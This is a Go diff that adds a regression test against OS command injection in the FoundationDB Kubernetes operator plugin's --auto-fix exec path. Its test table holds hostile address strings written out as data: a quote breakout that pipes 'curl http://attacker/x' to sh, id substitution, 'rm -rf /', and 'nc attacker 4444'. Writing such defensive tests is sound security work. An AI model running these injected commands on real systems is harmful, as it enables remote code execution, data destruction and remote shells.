@@ -24,15 +24,20 @@ import (
 	"bytes"
 	"context"
 	"fmt"
+	"net"
+	"net/url"
 	"strings"
 	"time"
 
 	fdbv1beta2 "github.com/FoundationDB/fdb-kubernetes-operator/v2/api/v1beta2"
+	kubeHelper "github.com/FoundationDB/fdb-kubernetes-operator/v2/internal/kubernetes"
 	. "github.com/onsi/ginkgo/v2"
 	. "github.com/onsi/gomega"
 	corev1 "k8s.io/api/core/v1"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/cli-runtime/pkg/genericiooptions"
+	"k8s.io/client-go/rest"
+	"k8s.io/client-go/tools/remotecommand"
 )
 
 func getCluster(
@@ -89,6 +94,23 @@ func getPodList(
 					DeletionTimestamp: deletionTimestamp,
 				},
 				Status: status,
+			},
+		},
+	}
+}
+
+// getStatusWithProcess builds a minimal status with one error process at the given address.
+func getStatusWithProcess(addr fdbv1beta2.ProcessAddress) *fdbv1beta2.FoundationDBStatus {
+	return &fdbv1beta2.FoundationDBStatus{
+		Cluster: fdbv1beta2.FoundationDBStatusClusterInfo{
+			Processes: map[fdbv1beta2.ProcessGroupID]fdbv1beta2.FoundationDBStatusProcessInfo{
+				"storage-1": {
+					Address:  addr,
+					Locality: map[string]string{fdbv1beta2.FDBLocalityInstanceIDKey: "storage-1"},
+					Messages: []fdbv1beta2.FoundationDBStatusProcessMessage{
+						{Name: "io_error", Type: "io_error", Time: 1},
+					},
+				},
 			},
 		},
 	}
@@ -1061,6 +1083,93 @@ var _ = Describe("[plugin] analyze cluster", func() {
 				0,
 				"top 0 fault domains:",
 			),
+		)
+	})
+
+	When("running analyzeStatusInternal with --auto-fix", func() {
+		var (
+			capturedURL *url.URL
+			origSPDY    func(*rest.Config, string, *url.URL) (remotecommand.Executor, error)
+			origSleep   time.Duration
+		)
+
+		// commandArgs returns the argv from the captured exec request.
+		commandArgs := func() []string { return capturedURL.Query()["command"] }
+
+		BeforeEach(func() {
+			origSPDY = kubeHelper.NewSPDYExecutor
+			origSleep = killSleepDuration
+			capturedURL = nil
+			kubeHelper.NewSPDYExecutor = func(_ *rest.Config, _ string, u *url.URL) (remotecommand.Executor, error) {
+				capturedURL = u
+				return &kubeHelper.FakeExecutor{}, nil
+			}
+			killSleepDuration = 0
+		})
+
+		AfterEach(func() {
+			kubeHelper.NewSPDYExecutor = origSPDY
+			killSleepDuration = origSleep
+		})
+
+		runAutoFix := func(status *fdbv1beta2.FoundationDBStatus) {
+			outBuffer := bytes.Buffer{}
+			errBuffer := bytes.Buffer{}
+			inBuffer := bytes.Buffer{}
+			cmd := newAnalyzeCmd(
+				genericiooptions.IOStreams{In: &inBuffer, Out: &outBuffer, ErrOut: &errBuffer},
+			)
+			pod := &getPodList(clusterName, namespace, corev1.PodStatus{Phase: corev1.PodRunning}, nil).Items[0]
+			// Returns a non-nil error because foundIssues=true; unrelated to the exec we inspect.
+			_ = analyzeStatusInternal(
+				cmd,
+				&rest.Config{Host: "https://fake"},
+				k8sClient,
+				status,
+				pod,
+				true,
+				clusterName,
+			)
+		}
+
+		// Regression test for the OS command injection: shell metacharacters in the address must land
+		// inside argv[2], never as a standalone argv element a shell could re-parse.
+		DescribeTable("forwards each argv element verbatim and never invokes a shell",
+			func(addr fdbv1beta2.ProcessAddress, expectedKillAddr string) {
+				runAutoFix(getStatusWithProcess(addr))
+
+				Expect(commandArgs()).To(Equal([]string{
+					"fdbcli",
+					"--exec",
+					fmt.Sprintf("kill; kill %s; sleep 5; status", expectedKillAddr),
+				}))
+				Expect(commandArgs()).NotTo(ContainElement("/bin/bash"))
+				Expect(commandArgs()).NotTo(ContainElement("/bin/sh"))
+				Expect(commandArgs()).NotTo(ContainElement("-c"))
+				Expect(commandArgs()).NotTo(ContainElement(expectedKillAddr))
+			},
+			Entry("happy path: benign IP:port",
+				fdbv1beta2.ProcessAddress{IPAddress: net.ParseIP("10.0.1.42"), Port: 4500},
+				"10.0.1.42:4500"),
+			Entry("malicious: single-quote breakout",
+				fdbv1beta2.ProcessAddress{
+					StringAddress: "evil';curl http://attacker/x|sh;echo 'pwned",
+					Port:          4500,
+				},
+				// JoinHostPort brackets the host when it contains `:` (here, from http://).
+				"[evil';curl http://attacker/x|sh;echo 'pwned]:4500"),
+			Entry("malicious: backtick command substitution",
+				fdbv1beta2.ProcessAddress{StringAddress: "host`id`", Port: 4500},
+				"host`id`:4500"),
+			Entry("malicious: dollar command substitution",
+				fdbv1beta2.ProcessAddress{StringAddress: "host$(id)", Port: 4500},
+				"host$(id):4500"),
+			Entry("malicious: semicolon chaining",
+				fdbv1beta2.ProcessAddress{StringAddress: "host; rm -rf /", Port: 4500},
+				"host; rm -rf /:4500"),
+			Entry("malicious: pipe to remote shell",
+				fdbv1beta2.ProcessAddress{StringAddress: "host|nc attacker 4444", Port: 4500},
+				"host|nc attacker 4444:4500"),
 		)
 	})
 })
